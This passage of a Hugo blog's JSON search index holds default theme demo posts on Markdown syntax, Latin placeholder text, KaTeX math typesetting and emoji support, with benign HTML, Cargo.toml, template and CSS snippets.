\u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2019-03-11T00:00:00Z","image":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/markdown-syntax-guide/pawel-czerwinski-8uZPynIu-rQ-unsplash_hu6307248181568134095.jpg","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"},{"content":"Lorem est tota propiore conpellat pectoribus de pectora summo.\nRedit teque digerit hominumque toris verebor lumina non cervice subde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc caluere tempus inhospita parcite confusaque translucet patri vestro qui optatis lumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.\nExierant elisi ambit vivere dedere Duce pollice Eris modo Spargitque ferrea quos palude Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus silentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria tractus malis.\nComas hunc haec pietate fetum procerum dixit Post torum vates letum Tiresia Flumen querellas Arcanaque montibus omnes Quidem et Vagus elidunt The Van de Graaf Canon\nMane refeci capiebant unda mulcebat Victa caducifer, malo vulnere contra dicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere furit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.\nIubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli Lelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare Echionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert ausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae vulnus haerentia iuste et exercebat, sui et.\nEurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem Propoetides parte.\n","date":"2019-03-09T00:00:00Z","image":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/placeholder-text/matt-le-SJSpo9hQf7s-unsplash_hu10664154974910995856.jpg","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/placeholder-text/","title":"Placeholder Text"},{"content":"Mathematical notation in a Hugo project can be enabled by using third party JavaScript libraries.\nIn this example we will be using KaTeX\nCreate a partial under /layouts/partials/math.html Within this partial reference the Auto-render Extension or host these scripts locally. Include the partial in your templates like so: 1 2 3 {{ if or .Params.math .Site.Params.math }} {{ partial \u0026#34;math.html\u0026#34; . }} {{ end }} To enable KaTeX globally set the parameter math to true in a project\u0026rsquo;s configuration To enable KaTeX on a per page basis include the parameter math: true in content files Note: Use the online reference of Supported TeX Functions\nExamples Inline math: $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$\n$$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$","date":"2019-03-08T00:00:00Z","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/math-typesetting/","title":"Math Typesetting"},{"content":"Emoji can be enabled in a Hugo project in a number of ways.\nThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site\u0026rsquo;s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil:\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3 .emoji { font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols; } ","date":"2019-03-05T00:00:00Z","image":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash_hu5876398126655421130.jpg","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/emoji-support/","title":"Emoji Support"}]